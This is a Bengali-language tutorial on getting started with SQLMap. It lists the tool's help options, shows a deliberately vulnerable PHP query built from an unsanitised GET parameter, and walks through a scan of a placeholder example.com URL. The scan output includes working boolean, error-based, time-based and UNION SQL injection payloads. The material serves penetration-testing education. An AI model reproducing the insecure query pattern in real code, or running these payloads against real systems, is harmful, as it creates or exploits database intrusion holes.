## **Getting Started with SQLMap**


## 1. SQLMap Help

SQLMap-এ নতুন হলে প্রথমে Help message দেখা উচিত। Help দুই ধরনের:

### Basic Listing

- `-h` দিয়ে basic options ও switches দেখা যায়।
- সাধারণ কাজের জন্য প্রয়োজনীয় options দেখায়।

```
sqlmap -h
```

গুরুত্বপূর্ণ options:

| Option              | কাজ                                    |
| ------------------- | -------------------------------------- |
| `-h, --help`        | Basic help দেখায়                       |
| `-hh`               | Advanced help দেখায়                    |
| `--version`         | SQLMap version দেখায়                   |
| `-v VERBOSE`        | Verbosity level (0–6), default 1       |
| `-u URL, --url=URL` | Target URL নির্ধারণ                    |
| `-g GOOGLEDORK`     | Google dork result থেকে target URL নেয় |

### Advanced Listing

\- `-hh` দিয়ে সব options ও switches দেখা যায়।

```
sqlmap -hh
```

এখানে আরও বিস্তারিত options পাওয়া যায়।

Target options:

| Option              | কাজ                                         |
| ------------------- | ------------------------------------------- |
| `-u URL, --url=URL` | Target URL                                  |
| `-d DIRECT`         | Direct database connection string           |
| `-l LOGFILE`        | Burp বা WebScarab proxy log থেকে target নেয় |
| `-m BULKFILE`       | Text file থেকে একাধিক target নেয়            |
| `-r REQUESTFILE`    | File থেকে HTTP request load করে             |
| `-g GOOGLEDORK`     | Google dork result থেকে target URL নেয়      |
| `-c CONFIGFILE`     | Configuration INI file load করে             |

Request options:

| Option                   | কাজ                                  |
| ------------------------ | ------------------------------------ |
| `-A AGENT, --user-agent` | HTTP User-Agent header নির্ধারণ      |
| `-H HEADER, --header`    | Extra HTTP header যোগ করা            |
| `--method=METHOD`        | HTTP method নির্ধারণ (যেমন PUT)      |
| `--data=DATA`            | POST request-এর data পাঠানো          |
| `--param-del=PARAM`      | Parameter value split করার character |
| `--cookie=COOKIE`        | HTTP Cookie header নির্ধারণ          |
| `--cookie-del=COOKIE`    | Cookie value split করার character    |

আরও details-এর জন্য official [SQLMap Wiki](https://github.com/sqlmapproject/sqlmap/wiki/Usage?utm_source=chatgpt.com) দেখতে বলা হয়েছে।

## 2. Basic Scenario

একটি সাধারণ scenario:

1. Penetration tester এমন webpage পায় যেখানে `GET` parameter দিয়ে user input নেওয়া হয় (যেমন `id`)।
2. Parameter-টি SQL Injection vulnerable কি না test করে।
3. Vulnerable হলে backend database থেকে information retrieve করার চেষ্টা করে।
4. প্রয়োজনে underlying file system access বা OS command execution চেষ্টা করে।

### Vulnerable PHP Code

```
$link = mysqli_connect($host, $username, $password, $database, 3306);
$sql = "SELECT * FROM users WHERE id = " . $_GET["id"] . " LIMIT 0, 1";
$result = mysqli_query($link, $sql);
if (!$result)
    die("<b>SQL error:</b> ". mysqli_error($link) . "<br>\n");
```

- এখানে `id` GET parameter থেকে user input নেওয়া হচ্ছে।
- SQL query-এর মধ্যে সরাসরি `$_GET["id"]` যুক্ত করা হয়েছে।
- SQL query-তে error reporting enabled।
- Query execution-এ সমস্যা হলে database error web-server response-এ দেখা যাবে।
- ফলে manual parameter tampering করলেও error সহজে identify করা যায়।

Example URL:

`http://www.example.com/vuln.php?id=1`

## 3. SQLMap দিয়ে SQLi Test

Target URL:

`http://www.example.com/vuln.php?id=1`

Command:

```
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
```

- `-u` → Target URL নির্ধারণ করে।
- `--batch` → User input ছাড়াই default option automatically select করে।

### SQLMap কীভাবে Test করে?

1. Target URL-এর connection test করে।
2. URL content stable কি না check করে।
3. GET parameter `id` dynamic কি না check করে।
4. Basic heuristic test দিয়ে সম্ভাব্য injectable parameter ও DBMS identify করে।
5. XSS vulnerability-এর heuristic test-ও করে।
6. SQL Injection techniques দিয়ে parameter test করে।

Example output থেকে পাওয়া তথ্য:

- Possible DBMS: `MySQL`
- Parameter: `id`
- Parameter injectable পাওয়া গেছে:
  - Boolean-based blind
  - Error-based
  - Time-based blind
  - UNION query

SQLMap কিছু confirmation চাইতে পারে:

- অন্য DBMS-এর payload test বাদ দিতে চায় কি না।
- MySQL-এর জন্য additional tests চালাতে চায় কি না।
- অন্য parameter test চালিয়ে যাবে কি না।

`--batch` ব্যবহার করলে এগুলোর default option automatically select হয়।

### Detected Injection Points

SQLMap মোট 46 HTTP(s) requests দিয়ে নিচের injection points identify করেছে।

1\. Boolean-based blind

```
id=1 AND 8814=8814
```

2\. Error-based

```
id=1 AND (SELECT 7744 FROM(SELECT COUNT(*),CONCAT(0x7170706a71,(SELECT (ELT(7744=7744,1))),0x71707a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
```

3\. Time-based blind

```
id=1 AND (SELECT 3669 FROM (SELECT(SLEEP(5)))TIxJ)
```

4\. UNION query

```
id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x7170706a71,0x554d766a4d694850596b754f6f716250584a6d53485a52474a7979436647576e766a595374436e78,0x71707a7871)-- -
```

| DBMS Version   | MySQL >= 5.0 |
| Web Technology | PHP 5.2.6    |
| Web Server     | Apache 2.2.9 |
| HTTP Requests  | 46           |
